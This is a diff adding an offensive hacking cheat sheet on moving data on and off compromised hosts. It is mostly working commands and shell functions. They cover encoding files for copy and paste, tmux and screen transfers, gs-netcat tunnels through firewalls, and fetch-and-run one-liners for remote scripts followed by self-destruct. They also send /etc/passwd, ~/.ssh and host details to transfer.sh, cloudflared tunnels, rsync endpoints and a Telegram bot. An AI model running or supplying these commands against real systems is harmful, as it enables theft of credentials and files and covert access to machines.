@@ -1,0 +1,353 @@
+Data Upload/Download/Exfil
+
+4.i File Encoding
+
+Trick to transfer a file to the target when the target does not have access to the Internet: Convert the binary file into ASCII-text (base64) and then use cut & paste. (Alternatively use gs-netcat's elite console with Ctrl-e c to transfer file over the same TCP connection.)
+
+Use xclip (on your workstation) to pipe the encoded data straight into your clipboard:
+
+base64 -w0 </etc/issue.net | xclip
+
+>>> UU encode/decode
+
+## uuencode 
+uuencode /etc/issue.net issue.net-COPY
+
+Output - CLICK HERE
+
+
+
+
+## uudecode (cut & paste the 3 lines from above):
+uudecode
+
+>>> base64 encode/decode
+
+base64 -w0 </etc/issue.net 
+
+Output - CLICK HERE
+
+base64 -d >issue.net-COPY
+
+>>> Openssl encode/decode
+
+openssl base64 </etc/issue.net 
+
+Output - CLICK HERE
+
+openssl base64 -d >issue.net-COPY
+
+>>> xxd encode/decode
+
+xxd -p </etc/issue.net
+
+Output - CLICK HERE
+
+xxd -p -r >issue.net-COPY
+
+4.ii. File transfer - using cut & paste
+
+Paste into a file on the remote machine (note the <<-'__EOF__' to not mess with tabs or $-variables).
+
+cat >output.txt <<-'__EOF__'
+[...]
+__EOF__  ### Finish your cut & paste by typing __EOF__
+
+4.iii. File transfer - using tmux
+
+Start tmux on your workstation. Connect to your target by any means you like (ssh, gs-netcat, ...).
+From REMOTE to LOCAL (download)
+
+Use Tmux-Logging to download large files from the target via the terminal to your workstation.
+From LOCAL to REMOTE (upload)
+
+Start your favorite decoding tool (base64) on the REMOTE:
+
+# Use 'Ctrl-b $' to rename this tmux session to 'foo'
+base64 -d >screen-xfer.txt
+
+On your workstation, and from a different terminal, send base64-encoded data. It will arrive on your REMOTE in screen-xfer.txt.
+
+tmux send-keys -t foo "$(base64 -w64 </etc/issue.net)"$'\n'
+# Press 'Ctrl-d' in the receiving terminal.
+# Optional: Use -t foo:1.2 to send to window #1 and pane #2 instead.
+# Optional: Use 'Ctrl-b ,' to rename the window
+
+4.vi. File transfer - using screen
+From REMOTE to LOCAL (download)
+
+Have a screen running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:
+
+    CTRL-a : logfile screen-xfer.txt
+
+    CTRL-a H
+
+We use openssl to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and screen will write this data to screen-xfer.txt:
+
+## On the remote system encode issue.net
+openssl base64 </etc/issue.net
+
+Stop your local screen from logging any further data:
+
+    CTRL-a H
+
+On your local computer decode the file:
+
+openssl base64 -d <screen-xfer.txt
+rm -rf screen-xfer.txt
+
+From LOCAL to REMOTE (upload)
+
+On your local system encode the data:
+
+openssl base64 </etc/issue.net >screen-xfer.txt
+
+On the remote system (and from within the current screen):
+
+openssl base64 -d
+
+Get screen to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:
+
+    CTRL-a : readbuf screen-xfer.txt
+
+    CTRL-a : paste .
+
+    CTRL-d
+
+    CTRL-d
+
+Note: Two CTRL-d are required due to a bug in openssl.
+
+4.v. File transfer - using gs-netcat and sftp
+
+Use gs-netcat and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.
+
+gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host behind NAT/Firewall
+
+From your workstation execute this command to connect to the SFTP server:
+
+export GSOCKET_ARGS="-s MySecret"                        # Workstation
+sftp -D gs-netcat                                        # Workstation
+
+Or to DUMP a single file:
+
+# On the sender
+gs-netcat -l <"FILENAME" # Will output a SECRET used by the receiver
+
+# On the receiver
+gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
+
+4.vi. File transfer - using HTTPs
+Download from Server to Receiver:
+
+On the Sender/Server:
+
+## Spawn a temporary HTTP server and share the current working directory.
+python -m http.server 8080 --bind 127.0.0.1 &
+# alternative: php -S 127.0.0.1:8080
+cloudflared tunnel -url localhost:8080
+
+Receiver: Access the URL from any browser to view/download the remote file system.
+1 - Upload using PHP:
+
+On the Receiver:
+
+curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
+mkdir upload
+(cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
+cloudflared tunnel --url localhost:8080 --no-autoupdate
+
+On the Sender:
+
+# Set a function:
+up() { curl -fsSL -F "file=@${1:?}" https://ABOVE-URL-HERE.trycloudflare.com; }
+# upload files like so:
+up warez.tar.gz
+up /etc/passwd
+
+2 - Upload using PYTHON:
+
+On the Receiver:
+
+pip install uploadserver
+python -m uploadserver &
+cloudflared tunnel -url localhost:8000
+
+On the Sender:
+
+curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
+
+4.vii. File download without curl
+
+Using Python, download only:
+
+# Declare a curl-alternative
+purl() {
+    local url="${1:?}"
+    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
+    "$(which python3 || which python || which python2 || which false)" -c "\
+import urllib.request
+import sys
+import ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", timeout=10, context=ctx).read())"
+}
+# purl ipinfo.io
+
+Example: Installing gsocket with purl:
+
+# cut & paste the above purl() function into your bash. Then cut & paste the following:
+source <(purl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh) \
+&& bin curl \
+&& bash -c "$(curl -fsSL https://gsocket.io/y)" \
+&& xdestruct
+
+Using OpenSSL, download only:
+
+surl() {
+    local r="${1#*://}"
+    local opts=("-quiet" "-ign_eof")
+    IFS=/ read -r host query <<<"${r}"
+    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
+    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
+	| openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
+	| sed '1,/^\r\{0,1\}$/d'
+}
+# surl ipinfo.io
+
+using Perl, download only:
+
+lurl() {
+    local url="${1:?}"
+    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
+    perl -e 'use LWP::Simple qw(get);
+my $url = '"'${1:?}'"';
+print(get $url);'
+}
+# lurl ipinfo.io
+
+Using bash, download only:
+
+burl() {
+    IFS=/ read -r proto x host query <<<"$1"
+    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
+    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
+    exec 3>&-
+}
+# burl http://ipinfo.io
+# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
+
+4.viii. File transfer using a public dump
+
+Cut & paste into your bash:
+
+transfer() {
+    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
+    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
+    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
+    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
+    curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
+}
+
+then upload a file or a directory:
+
+transfer /etc/passwd  # A single file
+transfer ~/.ssh       # An entire directory
+(curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
+
+A list of our favorite public upload sites.
+
+4.ix. File transfer - using rsync
+
+Ideal for synchronizing large amount of directories or re-starting broken transfers. The example transfers the directory 'warez' to the Receiver using a single TCP connection from the Sender to the Receiver.
+
+Receiver:
+
+echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
+mkdir upload
+rsync --daemon --port=31337 --config=r.conf --no-detach
+
+Sender:
+
+rsync -av warez rsync://1.2.3.4:31337/up
+
+The same encrypted (OpenSSL):
+
+Receiver:
+
+# use rsa:2048 if ed25519 is not supported (e.g. rsync connection error)
+openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
+cat ssl.key ssl.crt >ssl.pem
+rm -f ssl.key ssl.crt
+mkdir upload
+cat ssl.pem
+socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
+
+Sender:
+
+# Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
+IP=1.2.3.4
+PORT=31337
+# Using rsync + socat-ssl
+up1() {
+   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
+}
+# Using rsync + openssl
+up2() {
+   rsync -ahPRv -e "bash -c 'openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
+}
+up1 /var/www/./warez
+up2 /var/www/./warez
+
+Rsync can be combined to exfil via https / cloudflared raw TCP tunnels.
+(To exfil from Windows, use the rsync.exe from the gsocket windows package). A noisier solution is syncthing.
+
+Pro Tip: Lazy hackers just type exfil on segfault.net.
+
+4.x. File transfer - using WebDAV
+
+On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
+
+cloudflared tunnel --url localhost:8080 &
+# [...]
+# +--------------------------------------------------------------------------------------------+
+# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
+# |  https://example-foo-bar-lights.trycloudflare.com                                          |
+# +--------------------------------------------------------------------------------------------+
+# [...]
+wsgidav --port=8080 --root=.  --auth=anonymous
+
+On another server:
+
+# Upload a file to your workstation
+curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
+# Create a directory remotely
+curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
+# Create a directory hierarchy remotely
+find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
+# Upload all *.c files (in parallel):
+find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
+
+Access the share from Windows (to drag & drop files) in File Explorer:
+
+\\example-foo-bar-lights.trycloudflare.com@SSL\sources
+
+Or mount the WebDAV share on Windows (Z:/):
+
+net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
+
+4.xi. File transfer to Telegram
+
+There are zillions of upload services but TG is a neat alternative. Get a TG-Bot-Token from the TG BotFather. Then create a new TG group and add your bot to the group. Retrieve the chat_id of that group:
+
+curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" | jq -r '.result[].message.chat.id' | uniq
+# If you get only {"ok":true,"result":[]} then remove and add the bot again.
+
+# Upload file.zip straight into the group chat:
+curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocument?chat_id=<TG-CHAT-ID>"
+
+
